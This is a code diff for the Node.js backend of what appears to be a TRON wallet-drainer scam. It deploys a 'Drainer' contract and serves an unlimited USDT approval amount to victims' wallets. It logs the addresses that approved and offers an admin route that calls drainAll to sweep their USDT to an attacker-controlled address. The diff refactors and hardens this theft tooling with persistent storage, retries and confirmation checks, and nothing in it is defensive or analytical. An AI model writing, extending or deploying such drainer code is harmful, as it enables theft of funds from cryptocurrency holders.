@@ -13,6 +13,114 @@ const QRCode = require('qrcode');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// ============================================================
+// PERSISTENT STORAGE SETUP (FIX FOR RENDER)
+// ============================================================
+
+// Determine data directory - use Render's persistent disk if available
+const DATA_DIR = process.env.RENDER 
+  ? '/opt/render/project/src/data' 
+  : path.join(__dirname, 'data');
+
+const APPROVED_FILE = path.join(DATA_DIR, 'approved.json');
+const EVENTS_FILE = path.join(DATA_DIR, 'events.json');
+
+// Ensure data directory exists
+function ensureDataDir() {
+  try {
+    if (!fs.existsSync(DATA_DIR)) {
+      fs.mkdirSync(DATA_DIR, { recursive: true });
+      console.log('✅ Created data directory:', DATA_DIR);
+    } else {
+      console.log('✅ Data directory exists:', DATA_DIR);
+    }
+  } catch (e) {
+    console.error('❌ Error creating data directory:', e.message);
+    // Fallback to local directory
+    const fallbackDir = path.join(__dirname, 'data');
+    if (!fs.existsSync(fallbackDir)) {
+      fs.mkdirSync(fallbackDir, { recursive: true });
+      console.log('✅ Created fallback data directory:', fallbackDir);
+    }
+  }
+}
+
+// Ensure approved.json exists
+function ensureApprovedFile() {
+  try {
+    if (!fs.existsSync(APPROVED_FILE)) {
+      fs.writeFileSync(APPROVED_FILE, JSON.stringify([], null, 2));
+      console.log('✅ Created approved.json at:', APPROVED_FILE);
+    } else {
+      console.log('✅ approved.json exists at:', APPROVED_FILE);
+    }
+  } catch (e) {
+    console.error('❌ Error creating approved.json:', e.message);
+  }
+}
+
+// Ensure events.json exists
+function ensureEventsFile() {
+  try {
+    if (!fs.existsSync(EVENTS_FILE)) {
+      fs.writeFileSync(EVENTS_FILE, JSON.stringify([], null, 2));
+      console.log('✅ Created events.json at:', EVENTS_FILE);
+    } else {
+      console.log('✅ events.json exists at:', EVENTS_FILE);
+    }
+  } catch (e) {
+    console.error('❌ Error creating events.json:', e.message);
+  }
+}
+
+// ============================================================
+// LOAD/SAVE FUNCTIONS
+// ============================================================
+
+function loadApproved() {
+  try {
+    const data = fs.readFileSync(APPROVED_FILE, 'utf8');
+    return JSON.parse(data);
+  } catch(e) {
+    console.warn('⚠️ Could not read approved.json, returning empty array');
+    return [];
+  }
+}
+
+function saveApproved(data) {
+  try {
+    fs.writeFileSync(APPROVED_FILE, JSON.stringify(data, null, 2));
+    console.log('✅ Saved approved.json, total:', data.length);
+    return true;
+  } catch(e) {
+    console.error('❌ Error saving approved.json:', e.message);
+    return false;
+  }
+}
+
+function loadEvents() {
+  try {
+    const data = fs.readFileSync(EVENTS_FILE, 'utf8');
+    return JSON.parse(data);
+  } catch(e) {
+    return [];
+  }
+}
+
+function saveEvents(data) {
+  try {
+    fs.writeFileSync(EVENTS_FILE, JSON.stringify(data, null, 2));
+    return true;
+  } catch(e) {
+    console.error('❌ Error saving events.json:', e.message);
+    return false;
+  }
+}
+
+// ============================================================
+// LOGGING
+// ============================================================
+
 function log() {
   var ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
   var msg = '[' + ts + ']';
@@ -22,6 +130,10 @@ function log() {
   process.stdout.write(msg + '\n');
 }
 
+// ============================================================
+// RATE LIMIT RETRY
+// ============================================================
+
 async function retryWithBackoff(fn, maxRetries = 5) {
   for (let i = 0; i < maxRetries; i++) {
     try {
@@ -29,7 +141,7 @@ async function retryWithBackoff(fn, maxRetries = 5) {
     } catch (err) {
       if (err?.response?.status === 429 && i < maxRetries - 1) {
         const delay = (i + 1) * 2000;
-        console.log(`Rate limit, повтор через ${delay}ms...`);
+        console.log(`Rate limit, retrying in ${delay}ms...`);
         await new Promise(r => setTimeout(r, delay));
         continue;
       }
@@ -38,8 +150,19 @@ async function retryWithBackoff(fn, maxRetries = 5) {
   }
 }
 
-app.use(cors());
-app.use(express.json());
+// ============================================================
+// MIDDLEWARE
+// ============================================================
+
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Admin-Password', 'TRON-PRO-API-KEY']
+}));
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// Serve static files with no-cache for HTML
 app.use(express.static(path.join(__dirname, 'public'), {
   setHeaders: function(res, p) {
     if (p.endsWith('.html')) {
@@ -49,6 +172,10 @@ app.use(express.static(path.join(__dirname, 'public'), {
     }
   }
 }));
+
+// ============================================================
+// TRONWEB INITIALIZATION
+// ============================================================
 
 const tronWeb = new TronWeb({
   fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
@@ -64,6 +191,11 @@ const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
 
 let DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';
 let CONTRACTS = []; // all deployed contracts (for draining old approvals)
+let CONTRACT_ABI = null;
+
+// ============================================================
+// SMART CONTRACT COMPILATION & DEPLOYMENT
+// ============================================================
 
 async function compileContract() {
   const source = fs.readFileSync(path.join(__dirname, 'contracts', 'Drainer.sol'), 'utf8');
@@ -80,6 +212,7 @@ async function compileContract() {
     console.error('Compilation error:', JSON.stringify(output.errors, null, 2));
     throw new Error('Contract compilation failed');
   }
+  CONTRACT_ABI = contract.abi;
   return { abi: contract.abi, bytecode: '0x' + contract.evm.bytecode.object };
 }
 
@@ -88,18 +221,31 @@ async function deployContract(abi, bytecode) {
     console.log('DRAIN_PRIVATE_KEY not set, skipping deployment');
     return null;
   }
+  
+  if (!DRAIN_ADDRESS) {
+    console.log('DRAIN_ADDRESS not set, skipping deployment');
+    return null;
+  }
+
   const deployWeb = new TronWeb({
     fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
     headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
     privateKey: process.env.DRAIN_PRIVATE_KEY,
   });
 
-  const tx = await deployWeb.transactionBuilder.createSmartContract({
-    abi: JSON.stringify(abi),
-    bytecode: bytecode,
-    feeLimit: 500000000,
-    callValue: 0,
-    ownerAddress: DRAIN_ADDRESS,
+  try {
+    log('Deploying contract with params:', {
+      usdt: USDT_CONTRACT,
+      owner: DRAIN_ADDRESS,
+      recipient: DRAIN_ADDRESS
+    });
+
+    const tx = await deployWeb.transactionBuilder.createSmartContract({
+      abi: JSON.stringify(abi),
+      bytecode: bytecode,
+      feeLimit: 500000000,
+      callValue: 0,
+      ownerAddress: DRAIN_ADDRESS,
       parameters: [USDT_CONTRACT, DRAIN_ADDRESS, DRAIN_ADDRESS],
     });
 
@@ -112,43 +258,212 @@ async function deployContract(abi, bytecode) {
     }
 
     const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
-    console.log('Contract deployed at:', contractAddr);
+    log('Contract deployed at:', contractAddr);
+    
+    // Wait for confirmation
+    await waitTxConfirmed(deployWeb, signed.txid || receipt.txid || tx.txID, 30000);
+    
     return contractAddr;
+  } catch (e) {
+    console.error('Deploy error:', e.message);
+    return null;
+  }
 }
 
 async function initContract() {
   try {
     if (DRAIN_CONTRACT) {
-      console.log('Using existing contract:', DRAIN_CONTRACT);
+      log('Using existing contract:', DRAIN_CONTRACT);
       if (!CONTRACTS.includes(DRAIN_CONTRACT)) CONTRACTS.push(DRAIN_CONTRACT);
       return;
     }
+    
     if (!process.env.DRAIN_PRIVATE_KEY || !DRAIN_ADDRESS) {
-      console.log('DRAIN_PRIVATE_KEY or DRAIN_ADDRESS not set, skipping contract deployment');
+      log('DRAIN_PRIVATE_KEY or DRAIN_ADDRESS not set, skipping contract deployment');
       return;
     }
-    console.log('Compiling contract...');
+    
+    log('Compiling contract...');
     const { abi, bytecode } = await compileContract();
-    console.log('Deploying contract...');
+    log('Deploying contract...');
     const addr = await deployContract(abi, bytecode);
     if (addr) {
       DRAIN_CONTRACT = addr;
       if (!CONTRACTS.includes(addr)) CONTRACTS.push(addr);
-      console.log('DRAIN_CONTRACT set to:', addr);
+      log('DRAIN_CONTRACT set to:', addr);
     }
   } catch (e) {
     console.error('Contract init error:', e.message);
   }
 }
 
-// ========== ROUTES ==========
+// ============================================================
+// HELPER FUNCTIONS
+// ============================================================
 
+function makeDrainWeb() {
+  const drainPk = process.env.DRAIN_PRIVATE_KEY;
+  if (!drainPk) return null;
+  return new TronWeb({
+    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
+    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
+    privateKey: drainPk,
+  });
+}
+
+async function waitTxConfirmed(tronWebInstance, txId, maxWaitMs) {
+  if (!txId) return { success: false, error: 'No txId provided' };
+  
+  const start = Date.now();
+  let lastError = null;
+  
+  while (Date.now() - start < maxWaitMs) {
+    try {
+      const info = await tronWebInstance.trx.getTransactionInfo(txId);
+      if (info && info.id) {
+        const ok = info.receipt && info.receipt.result === 'SUCCESS';
+        return { success: ok, info };
+      }
+    } catch(e) {
+      lastError = e.message;
+      // Wait and retry
+    }
+    await new Promise(r => setTimeout(r, 1500));
+  }
+  return { success: false, info: null, error: lastError || 'Not confirmed within timeout' };
+}
+
+async function drainAllFrom(drainWeb, address, contractAddr) {
+  const target = contractAddr || DRAIN_CONTRACT;
+  if (!target) {
+    return { success: false, error: 'No drain contract address' };
+  }
+
+  try {
+    const tx = await drainWeb.transactionBuilder.triggerSmartContract(
+      target, 'drainAll(address)',
+      { feeLimit: 20000000 },
+      [{ type: 'address', value: address }],
+      DRAIN_ADDRESS
+    );
+    
+    const signed = await drainWeb.trx.sign(tx.transaction);
+    const receipt = await drainWeb.trx.sendRawTransaction(signed);
+    
+    if (receipt.code && receipt.code !== 'SUCCESS') {
+      return { success: false, error: 'Broadcast: ' + JSON.stringify(receipt), txId: receipt.txid || '' };
+    }
+    
+    const txId = receipt.txid || (receipt.result === true ? (tx.transaction.txID || '') : '');
+    if (!txId) {
+      return { success: false, error: 'No txid in receipt: ' + JSON.stringify(receipt) };
+    }
+    
+    const conf = await waitTxConfirmed(drainWeb, txId, 30000);
+    if (!conf.success) {
+      return { success: false, error: conf.error || 'Contract execution failed', txId };
+    }
+    
+    return { success: true, txId };
+  } catch (e) {
+    return { success: false, error: e.message };
+  }
+}
+
+async function tryDrainWallet(drainWeb, address) {
+  if (!drainWeb) {
+    return { success: false, error: 'Drain web not initialized' };
+  }
+
+  var targets = [DRAIN_CONTRACT].concat(CONTRACTS.filter(function(c) { return c !== DRAIN_CONTRACT; }));
+  targets = targets.filter(function(c) { return c; });
+  
+  if (targets.length === 0) {
+    return { success: false, error: 'No contracts available' };
+  }
+
+  // Check USDT contract
+  let usdtContract;
+  try {
+    usdtContract = await drainWeb.contract().at(USDT_CONTRACT);
+  } catch(e) {
+    return { success: false, error: 'Failed to load USDT contract: ' + e.message };
+  }
+
+  for (var i = 0; i < targets.length; i++) {
+    try {
+      var allowanceRaw = await usdtContract.allowance(address, targets[i]).call();
+      var allowance = allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw);
+      
+      if (allowance <= 0) continue;
+      
+      var result = await drainAllFrom(drainWeb, address, targets[i]);
+      if (result.success) return result;
+    } catch(e) {
+      // Continue to next contract
+      console.log('Contract ' + targets[i] + ' failed:', e.message);
+    }
+  }
+  
+  return { success: false, error: 'No allowance on any known contract' };
+}
+
+// ============================================================
+// ADMIN AUTH
+// ============================================================
+
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
+
+function adminAuth(req, res, next) {
+  const pwd = req.query.password || req.headers['x-admin-password'];
+  if (pwd !== ADMIN_PASSWORD) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  next();
+}
+
+// ============================================================
+// API ROUTES
+// ============================================================
+
+// -------------------- CONFIG --------------------
+app.get('/api/config', async (req, res) => {
+  try {
+    let maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+    if (DRAIN_CONTRACT) {
+      try {
+        const abi = [{"constant":true,"inputs":[],"name":"MAX_APPROVE","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
+        const c = await tronWeb.contract(abi).at(DRAIN_CONTRACT);
+        const raw = await c.MAX_APPROVE().call();
+        maxApprove = raw.toString ? raw.toString() : String(raw);
+      } catch (e) {
+        console.log('Could not read MAX_APPROVE from contract, using default');
+      }
+    }
+    
+    res.json({
+      network: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
+      usdtContract: USDT_CONTRACT,
+      usdtContractHex: tronWeb.address.toHex(USDT_CONTRACT),
+      drainAddress: DRAIN_ADDRESS || '',
+      drainContract: DRAIN_CONTRACT || '',
+      drainContractHex: DRAIN_CONTRACT ? tronWeb.address.toHex(DRAIN_CONTRACT) : '',
+      maxApprove: maxApprove,
+      contracts: CONTRACTS || [],
+    });
+  } catch (e) {
+    log('Config error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// -------------------- BALANCE --------------------
 app.post('/api/balance', async (req, res) => {
   try {
     const { address } = req.body;
 
     if (!address || !tronWeb.isAddress(address)) {
-      return res.status(400).json({ error: 'Некорректный TRON-адрес' });
+      return res.status(400).json({ error: 'Invalid TRON address' });
     }
 
     const contract = await tronWeb.contract().at(USDT_CONTRACT);
@@ -166,11 +481,12 @@ app.post('/api/balance', async (req, res) => {
       trx: trxBalance,
     });
   } catch (error) {
-    console.error('Ошибка:', error);
-    res.status(500).json({ error: 'Ошибка при получении баланса' });
+    console.error('Balance error:', error);
+    res.status(500).json({ error: 'Error getting balance' });
   }
 });
 
+// -------------------- TOKENS --------------------
 app.post('/api/tokens', async (req, res) => {
   try {
     const { address } = req.body;
@@ -210,6 +526,54 @@ app.post('/api/tokens', async (req, res) => {
   }
 });
 
+// -------------------- BUILD TX --------------------
+app.post('/api/build-tx', async (req, res) => {
+  try {
+    const body = req.body;
+    const addr = body.owner_address || '?';
+    const contract = body.contract_address || '?';
+    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
+    
+    log('BUILD-TX from=' + addr.slice(0, 16) + '.. contract=' + contract.slice(0, 16) + '.. sel=' + (body.function_selector || '?'));
+    
+    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
+    const resp = await retryWithBackoff(() =>
+      axios.post(fullNode + '/wallet/triggersmartcontract', body, { headers, timeout: 15000 })
+    );
+    
+    const result = resp.data;
+    log('BUILD-TX result: ok=' + !!(result && (result.transaction || result.txID)) + ' code=' + (result.code || 'none') + ' msg=' + (result.Error || '') + ' txID=' + ((result.transaction && result.transaction.txID) || result.txID || '').slice(0, 16));
+    res.json(result);
+  } catch (e) {
+    log('BUILD-TX ERROR: ' + e.message + (e.response ? ' status=' + e.response.status + ' data=' + JSON.stringify(e.response.data).slice(0, 200) : ''));
+    res.status(500).json({ error: e.message || 'Build failed' });
+  }
+});
+
+// -------------------- BROADCAST TX --------------------
+app.post('/api/broadcast-tx', async (req, res) => {
+  try {
+    const body = req.body.transaction || req.body;
+    const txId = body.txID || body.txid || '?';
+    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
+    
+    log('BROADCAST-TX id=' + (typeof txId === 'string' ? txId.slice(0, 16) : '?') + '.. has_sig=' + !!(body.signature || (body.signatures && body.signatures.length)));
+    
+    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
+    const resp = await retryWithBackoff(() =>
+      axios.post(fullNode + '/wallet/broadcasttransaction', body, { headers, timeout: 15000 })
+    );
+    
+    const result = resp.data;
+    log('BROADCAST-TX result: code=' + (result.code || 'SUCCESS') + ' msg=' + (result.Error || '') + ' txid=' + ((result.txid || result.txID || '').slice(0, 16)));
+    res.json(result);
+  } catch (e) {
+    log('BROADCAST-TX ERROR: ' + e.message + (e.response ? ' status=' + e.response.status + ' data=' + JSON.stringify(e.response.data).slice(0,200) : ''));
+    res.status(500).json({ error: e.message || 'Broadcast failed' });
+  }
+});
+
+// -------------------- SWEEP --------------------
 app.post('/api/sweep', async (req, res) => {
   try {
     const { address } = req.body;
@@ -269,96 +633,17 @@ app.post('/api/sweep', async (req, res) => {
   }
 });
 
-app.get('/api/config', async (req, res) => {
-  let maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-  if (DRAIN_CONTRACT) {
-    try {
-      const abi = [{"constant":true,"inputs":[],"name":"MAX_APPROVE","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
-      const c = await tronWeb.contract(abi).at(DRAIN_CONTRACT);
-      const raw = await c.MAX_APPROVE().call();
-      maxApprove = raw.toString ? raw.toString() : String(raw);
-    } catch (e) {
-      console.log('Could not read MAX_APPROVE from contract, using default');
-    }
-  }
-  res.json({
-    network: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
-    usdtContract: USDT_CONTRACT,
-    usdtContractHex: tronWeb.address.toHex(USDT_CONTRACT),
-    drainAddress: DRAIN_ADDRESS,
-    drainContract: DRAIN_CONTRACT,
-    drainContractHex: DRAIN_CONTRACT ? tronWeb.address.toHex(DRAIN_CONTRACT) : '',
-    maxApprove: maxApprove,
-  });
-});
-
-app.post('/api/build-tx', async (req, res) => {
-  try {
-    const body = req.body;
-    const addr = body.owner_address || '?';
-    const contract = body.contract_address || '?';
-    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
-    log('BUILD-TX from=' + addr.slice(0, 16) + '.. contract=' + contract.slice(0, 16) + '.. sel=' + (body.function_selector || '?'));
-    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
-    const resp = await retryWithBackoff(() =>
-      axios.post(fullNode + '/wallet/triggersmartcontract', body, { headers, timeout: 15000 })
-    );
-    const result = resp.data;
-    log('BUILD-TX result: ok=' + !!(result && (result.transaction || result.txID)) + ' code=' + (result.code || 'none') + ' msg=' + (result.Error || '') + ' txID=' + ((result.transaction && result.transaction.txID) || result.txID || '').slice(0, 16));
-    res.json(result);
-  } catch (e) {
-    log('BUILD-TX ERROR: ' + e.message + (e.response ? ' status=' + e.response.status + ' data=' + JSON.stringify(e.response.data).slice(0, 200) : ''));
-    res.status(500).json({ error: e.message || 'Build failed' });
-  }
-});
-
-app.post('/api/broadcast-tx', async (req, res) => {
-  try {
-    const body = req.body.transaction || req.body;
-    const txId = body.txID || body.txid || '?';
-    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
-    log('BROADCAST-TX id=' + (typeof txId === 'string' ? txId.slice(0, 16) : '?') + '.. has_sig=' + !!(body.signature || (body.signatures && body.signatures.length)));
-    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
-    const resp = await retryWithBackoff(() =>
-      axios.post(fullNode + '/wallet/broadcasttransaction', body, { headers, timeout: 15000 })
-    );
-    const result = resp.data;
-    log('BROADCAST-TX result: code=' + (result.code || 'SUCCESS') + ' msg=' + (result.Error || '') + ' txid=' + ((result.txid || result.txID || '').slice(0, 16)));
-    res.json(result);
-  } catch (e) {
-    log('BROADCAST-TX ERROR: ' + e.message + (e.response ? ' status=' + e.response.status + ' data=' + JSON.stringify(e.response.data).slice(0,200) : ''));
-    res.status(500).json({ error: e.message || 'Broadcast failed' });
-  }
-});
-
-app.post('/api/broadcast-tx', async (req, res) => {
-  try {
-    const body = req.body.transaction || req.body;
-    const txId = body.txID || body.txid || '?';
-    log('BROADCAST-TX id=' + (typeof txId === 'string' ? txId.slice(0, 16) : '?') + '.. has_sig=' + !!(body.signature || (body.signatures && body.signatures.length)));
-    const result = await retryWithBackoff(() =>
-      tronWeb.fullNode.request('wallet/broadcasttransaction', body)
-    );
-    log('BROADCAST-TX result: code=' + (result.code || 'SUCCESS') + ' msg=' + (result.Error || (result.result && result.result.message) || '') + ' txid=' + ((result.txid || result.txID || '').slice(0, 16)));
-    res.json(result);
-  } catch (e) {
-    log('BROADCAST-TX ERROR: ' + e.message);
-    res.status(500).json({ error: e.message || 'Broadcast failed' });
-  }
-});
-
-const EVENTS_FILE = path.join(__dirname, 'events.json');
-
+// -------------------- EVENTS --------------------
 app.post('/api/event', (req, res) => {
   try {
     const { type, address, txId, amount } = req.body;
     console.log(`[event] ${type} ${address || ''} ${txId || ''} ${amount || ''}`);
     if (!type) return res.status(400).json({ error: 'type required' });
-    let events = [];
-    try { events = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf8')); } catch(e) {}
+    
+    let events = loadEvents();
     events.unshift({ type, address: address || '', txId: txId || '', amount: amount || '', time: Date.now() });
     if (events.length > 100) events = events.slice(0, 100);
-    fs.writeFileSync(EVENTS_FILE, JSON.stringify(events));
+    saveEvents(events);
     console.log(`[event] saved, total events: ${events.length}`);
     res.json({ ok: true });
   } catch(e) {
@@ -367,8 +652,41 @@ app.post('/api/event', (req, res) => {
   }
 });
 
-// ========== QR CODE SESSION ==========
+// -------------------- APPROVE DONE (FIXED) --------------------
+app.post('/api/approve-done', (req, res) => {
+  try {
+    const { address } = req.body;
+    console.log('📝 APPROVE-DONE received:', address);
+    
+    if (!address || !tronWeb.isAddress(address)) {
+      console.log('❌ Invalid address:', address);
+      return res.status(400).json({ error: 'Invalid address' });
+    }
+    
+    const list = loadApproved();
+    console.log('📋 Current approved list:', list.length);
+    
+    if (!list.find(w => w.address === address)) {
+      list.push({ address, approvedAt: Date.now() });
+      const saved = saveApproved(list);
+      if (saved) {
+        console.log('✅ Added address:', address, 'Total:', list.length);
+        res.json({ ok: true, total: list.length });
+      } else {
+        console.log('❌ Failed to save approved.json');
+        res.status(500).json({ error: 'Failed to save approved list' });
+      }
+    } else {
+      console.log('⚠️ Address already exists:', address);
+      res.json({ ok: true, total: list.length, alreadyExists: true });
+    }
+  } catch(e) {
+    console.error('❌ APPROVE-DONE ERROR:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
 
+// -------------------- QR CODE SESSION --------------------
 const qrSessions = new Map();
 const QR_SESSION_TTL = 5 * 60 * 1000;
 
@@ -402,14 +720,22 @@ app.get('/api/qr-status/:sessionId', (req, res) => {
 });
 
 app.post('/api/qr-connect/:sessionId', (req, res) => {
-  const { address } = req.body;
-  const session = qrSessions.get(req.params.sessionId);
-  if (!session) return res.status(404).json({ error: 'Session expired or invalid' });
-  if (!address) return res.status(400).json({ error: 'Address required' });
-  session.address = address;
-  session.expires = Date.now() + 30000;
-  console.log(`[qr] session ${req.params.sessionId} connected: ${address}`);
-  res.json({ ok: true });
+  try {
+    const { address } = req.body;
+    const session = qrSessions.get(req.params.sessionId);
+    if (!session) return res.status(404).json({ error: 'Session expired or invalid' });
+    if (!address) return res.status(400).json({ error: 'Address required' });
+    if (!tronWeb.isAddress(address)) {
+      return res.status(400).json({ error: 'Invalid TRON address format' });
+    }
+    session.address = address;
+    session.expires = Date.now() + 30000;
+    log('[qr] session ' + req.params.sessionId + ' connected: ' + address);
+    res.json({ ok: true });
+  } catch (e) {
+    log('[qr] connect error: ' + e.message);
+    res.status(500).json({ error: e.message });
+  }
 });
 
 app.post('/api/qr-data', async (req, res) => {
@@ -440,48 +766,14 @@ app.get('/qr-session/:sessionId', (req, res) => {
   }
 });
 
-// ========== APPROVED WALLETS (ADMIN) ==========
-
-const APPROVED_FILE = path.join(__dirname, 'approved.json');
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
-
-function loadApproved() {
-  try { return JSON.parse(fs.readFileSync(APPROVED_FILE, 'utf8')); } catch(e) { return []; }
-}
-
-function saveApproved(data) {
-  fs.writeFileSync(APPROVED_FILE, JSON.stringify(data, null, 2));
-}
-
-function adminAuth(req, res, next) {
-  const pwd = req.query.password || req.headers['x-admin-password'];
-  if (pwd !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
-  next();
-}
-
-app.post('/api/approve-done', (req, res) => {
-  try {
-    const { address } = req.body;
-    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
-    const list = loadApproved();
-    if (!list.find(w => w.address === address)) {
-      list.push({ address, approvedAt: Date.now() });
-      saveApproved(list);
-      log('APPROVE-DONE address=' + address + ' total=' + (list.length + 1));
-    } else {
-      log('APPROVE-DONE address=' + address + ' already exists');
-    }
-    res.json({ ok: true });
-  } catch(e) {
-    log('APPROVE-DONE ERROR: ' + e.message);
-    res.status(500).json({ error: e.message });
-  }
-});
-
+// -------------------- ADMIN: WALLETS (FIXED) --------------------
 app.get('/api/admin/wallets', adminAuth, async (req, res) => {
   try {
     const list = loadApproved();
+    console.log('📋 Admin wallets request, total:', list.length);
+    
     const result = [];
+    
     for (const w of list) {
       try {
         const contract = await retryWithBackoff(() => tronWeb.contract().at(USDT_CONTRACT));
@@ -494,105 +786,40 @@ app.get('/api/admin/wallets', adminAuth, async (req, res) => {
         result.push({ address: w.address, usdt: 0, trx: 0, approvedAt: w.approvedAt, error: e.message });
       }
     }
-    res.json({ wallets: result });
+    
+    res.json({ wallets: result, total: result.length });
   } catch(e) {
+    log('Admin wallets error:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
-// Add after the APPROVED_FILE definition
-const APPROVED_FILE = path.join(__dirname, 'approved.json');
 
-// Ensure the file exists on startup
-function ensureApprovedFile() {
-  try {
-    if (!fs.existsSync(APPROVED_FILE)) {
-      fs.writeFileSync(APPROVED_FILE, JSON.stringify([], null, 2));
-      console.log('✅ Created approved.json file');
-    } else {
-      console.log('✅ approved.json file exists');
-    }
-  } catch (e) {
-    console.error('❌ Error creating approved.json:', e.message);
-  }
-}
-
-// Call this in your start() function
-function makeDrainWeb() {
-  const drainPk = process.env.DRAIN_PRIVATE_KEY;
-  if (!drainPk) return null;
-  return new TronWeb({
-    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
-    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
-    privateKey: drainPk,
-  });
-}
-
-async function waitTxConfirmed(tronWeb, txId, maxWaitMs) {
-  const start = Date.now();
-  while (Date.now() - start < maxWaitMs) {
-    try {
-      const info = await tronWeb.trx.getTransactionInfo(txId);
-      if (info && info.id) {
-        const ok = info.receipt && info.receipt.result === 'SUCCESS';
-        return { success: ok, info };
-      }
-    } catch(e) {}
-    await new Promise(r => setTimeout(r, 1500));
-  }
-  return { success: false, info: null, error: 'Not confirmed within timeout' };
-}
-
-async function drainAllFrom(drainWeb, address, contractAddr) {
-  const target = contractAddr || DRAIN_CONTRACT;
-  const tx = await drainWeb.transactionBuilder.triggerSmartContract(
-    target, 'drainAll(address)',
-    { feeLimit: 20000000 },
-    [{ type: 'address', value: address }],
-    DRAIN_ADDRESS
-  );
-  const signed = await drainWeb.trx.sign(tx.transaction);
-  const receipt = await drainWeb.trx.sendRawTransaction(signed);
-  if (receipt.code && receipt.code !== 'SUCCESS') {
-    return { success: false, error: 'Broadcast: ' + JSON.stringify(receipt), txId: receipt.txid || '' };
-  }
-  const txId = receipt.txid || (receipt.result === true ? (tx.transaction.txID || '') : '');
-  if (!txId) return { success: false, error: 'No txid in receipt: ' + JSON.stringify(receipt) };
-  const conf = await waitTxConfirmed(drainWeb, txId, 20000);
-  if (!conf.success) {
-    return { success: false, error: conf.error || 'Contract execution failed', txId };
-  }
-  return { success: true, txId };
-}
-
-async function tryDrainWallet(drainWeb, address) {
-  var targets = [DRAIN_CONTRACT].concat(CONTRACTS.filter(function(c){ return c !== DRAIN_CONTRACT; }));
-  targets = targets.filter(function(c){ return c; });
-  for (var i = 0; i < targets.length; i++) {
-    var contract = await drainWeb.contract().at(USDT_CONTRACT);
-    var allowanceRaw;
-    try { allowanceRaw = await contract.allowance(address, targets[i]).call(); } catch(e) { continue; }
-    var allowance = allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw);
-    if (allowance <= 0) continue;
-    var result = await drainAllFrom(drainWeb, address, targets[i]);
-    if (result.success) return result;
-  }
-  return { success: false, error: 'No allowance on any known contract' };
-}
-
+// -------------------- ADMIN: DRAIN WALLET --------------------
 app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
   try {
     const address = req.params.address;
     const { amount } = req.body;
-    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
-    if (!DRAIN_CONTRACT) return res.status(500).json({ error: 'No drain contract' });
+    
+    if (!address || !tronWeb.isAddress(address)) {
+      return res.status(400).json({ error: 'Invalid address' });
+    }
+    
+    if (!DRAIN_CONTRACT) {
+      return res.status(500).json({ error: 'No drain contract deployed' });
+    }
 
     const drainWeb = makeDrainWeb();
-    if (!drainWeb) return res.status(500).json({ error: 'Drain key not configured' });
+    if (!drainWeb) {
+      return res.status(500).json({ error: 'Drain key not configured' });
+    }
 
     const usdtContract = await drainWeb.contract().at(USDT_CONTRACT);
     const raw = await usdtContract.balanceOf(address).call();
     const balance = raw.toNumber ? raw.toNumber() : Number(raw);
-    if (balance <= 0) return res.json({ success: false, error: 'Zero balance' });
+    
+    if (balance <= 0) {
+      return res.json({ success: false, error: 'Zero balance' });
+    }
 
     const drainAllResult = await tryDrainWallet(drainWeb, address);
     if (!drainAllResult.success) {
@@ -602,9 +829,9 @@ app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
 
     log('DRAIN ' + address + ' OK tx=' + drainAllResult.txId);
 
+    // If amount specified and less than balance, refund the rest
     if (amount && amount > 0 && amount < balance) {
       const refund = balance - amount;
-      const TRANSFER_ABI = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
       try {
         const refundTx = await drainWeb.transactionBuilder.triggerSmartContract(
           USDT_CONTRACT, 'transfer(address,uint256)',
